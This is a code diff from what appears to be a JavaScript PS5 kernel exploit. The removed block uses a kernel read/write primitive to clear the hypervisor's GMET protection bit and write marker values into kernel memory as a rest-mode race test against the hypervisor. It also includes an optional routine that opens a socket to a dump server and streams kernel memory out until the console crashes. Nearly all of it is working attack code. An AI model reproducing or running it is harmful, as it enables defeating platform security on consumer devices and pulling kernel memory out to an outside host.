-                "Steps:\n" +
-                "1. Modify a .text pointer\n" +
-                "2. Put PS5 in REST MODE\n" +
-                "3. Wake and check if pointer was used\n\n" +
-                "OK = Setup race test\n" +
-                "Cancel = Skip"
-            );
-
-            if (runRaceTest) {
-                await log("========== INITIALIZATION RACE TEST ==========", LogLevel.SUCCESS);
-
-                // Use a known writable location - try SVM cache or mystery flag
-                const RACE_TEST_OFFSET = 0x4bf0; // SVM feature cache
-
-                let origVal = await krw.read4(krw.kdataBase.add32(RACE_TEST_OFFSET));
-                await log("[RACE] Original value at 0x" + RACE_TEST_OFFSET.toString(16) + ": 0x" + origVal.toString(16), LogLevel.INFO);
-
-                // For the race test, we'll set a marker value and instructions
-                await log("[RACE] Test setup:", LogLevel.WARN);
-                await log("[RACE] 1. We'll modify the SVM feature cache", LogLevel.INFO);
-                await log("[RACE] 2. Clear GMET bit (0x40000)", LogLevel.INFO);
-                await log("[RACE] 3. You put PS5 to REST MODE", LogLevel.INFO);
-                await log("[RACE] 4. Wake up and run exploit again", LogLevel.INFO);
-                await log("[RACE] 5. Check if modification persisted", LogLevel.INFO);
-
-                let doRaceSetup = confirm(
-                    "RACE TEST SETUP\n\n" +
-                    "Current SVM cache: 0x" + origVal.toString(16) + "\n" +
-                    "Will clear GMET bit (0x40000)\n\n" +
-                    "After clicking OK:\n" +
-                    "1. Put PS5 to REST MODE\n" +
-                    "2. Wake up\n" +
-                    "3. Run exploit again\n" +
-                    "4. Check this offset's value\n\n" +
-                    "OK = Modify and prepare for rest\n" +
-                    "Cancel = Skip"
-                );
-
-                if (doRaceSetup) {
-                    // Clear GMET bit
-                    let newVal = origVal & ~0x40000;
-                    await krw.write4(krw.kdataBase.add32(RACE_TEST_OFFSET), newVal);
-
-                    let verify = await krw.read4(krw.kdataBase.add32(RACE_TEST_OFFSET));
-                    await log("[RACE] Modified 0x" + RACE_TEST_OFFSET.toString(16) + ": 0x" + verify.toString(16), LogLevel.SUCCESS);
-
-                    if ((verify & 0x40000) === 0) {
-                        await log("[RACE] GMET bit CLEARED successfully", LogLevel.SUCCESS);
-                    } else {
-                        await log("[RACE] Warning: GMET bit still set?", LogLevel.WARN);
-                    }
-
-                    // Also write a marker to mystery flag for verification
-                    const MYSTERY_OFFSET = 0xD11D08;
-                    try {
-                        let mysteryOrig = await krw.read4(krw.kdataBase.add32(MYSTERY_OFFSET));
-                        await log("[RACE] Mystery flag original: 0x" + mysteryOrig.toString(16), LogLevel.INFO);
-
-                        // Write marker value 0xDEADBEEF
-                        await krw.write4(krw.kdataBase.add32(MYSTERY_OFFSET), 0xDEADBEEF);
-                        let mysteryVerify = await krw.read4(krw.kdataBase.add32(MYSTERY_OFFSET));
-                        await log("[RACE] Mystery flag marker set: 0x" + mysteryVerify.toString(16), LogLevel.SUCCESS);
-                    } catch (e) {
-                        await log("[RACE] Could not write mystery flag marker: " + e, LogLevel.WARN);
-                    }
-
-                    await log("", LogLevel.INFO);
-                    await log("========== RACE TEST READY ==========", LogLevel.SUCCESS);
-                    await log("[RACE] Modifications complete!", LogLevel.SUCCESS);
-                    await log("[RACE] NOW: Put PS5 to REST MODE", LogLevel.WARN);
-                    await log("[RACE] After wake: Run exploit, check values", LogLevel.WARN);
-                    await log("[RACE] Look for:", LogLevel.INFO);
-                    await log("[RACE]   - SVM cache: 0x700f12 (GMET clear)", LogLevel.INFO);
-                    await log("[RACE]   - Mystery flag: 0xDEADBEEF (marker)", LogLevel.INFO);
-                    await log("[RACE] If values persisted -> potential race!", LogLevel.INFO);
-
-                    alert(
-                        "RACE TEST READY!\n\n" +
-                        "NOW: Put PS5 to REST MODE\n\n" +
-                        "After wake:\n" +
-                        "- Run exploit again\n" +
-                        "- Check SVM cache and mystery flag values\n" +
-                        "- If GMET is still cleared, HV didn't reinit!"
-                    );
-                }
-            }
-        }
-
-        // OPTIONAL: Full kernel dump (disabled by default)
-        let doDump = false; // Set to confirm(...) to enable
-        if (doDump) {
-            let dump_sock_addr_store = p.malloc(0x10);
-            let dump_sock_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
-            await log("[DUMP] Opened socket: " + dump_sock_fd, LogLevel.INFO);
-
-            for (let i = 0; i < 0x10; i += 0x8) {
-                p.write8(dump_sock_addr_store.add32(i), new int64(0, 0));
-            }
-
-            p.write1(dump_sock_addr_store.add32(0x00), 0x10);
-            p.write1(dump_sock_addr_store.add32(0x01), AF_INET);
-            p.write2(dump_sock_addr_store.add32(0x02), DUMP_NET_PORT);
-            p.write4(dump_sock_addr_store.add32(0x04), DUMP_NET_ADDR);
-
-            await log("[DUMP] Connecting to dump server...", LogLevel.INFO);
-            let connect_res = await chain.syscall(SYS_CONNECT, dump_sock_fd, dump_sock_addr_store, 0x10);
-            await log("[DUMP] Connected: " + connect_res, LogLevel.INFO);
-
-            let dump_buf = p.malloc(0x8);
-            let dump_addr = krw.kdataBase;
-
-            await log("[DUMP] Starting dump from kdataBase: " + dump_addr, LogLevel.WARN);
-            alert("Starting kernel dump from kdataBase...\n\nDump will continue until crash.");
-
-            for (let j = 0; ; j++) {
-                let val = await krw.read8(dump_addr);
-                p.write8(dump_buf, val);
-                await chain.syscall(SYS_WRITE, dump_sock_fd, dump_buf, 0x8);
-                dump_addr = dump_addr.add32(0x8);
-
-                if (j % 0x8000 === 0) {
-                    await log("[DUMP] Progress: 0x" + dump_addr + " (" + (j * 8 / 1024 / 1024).toFixed(1) + " MB)", LogLevel.INFO | LogLevel.FLAG_TEMP);
-                }
-            }
-        }
 
         // Set security flags
         let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
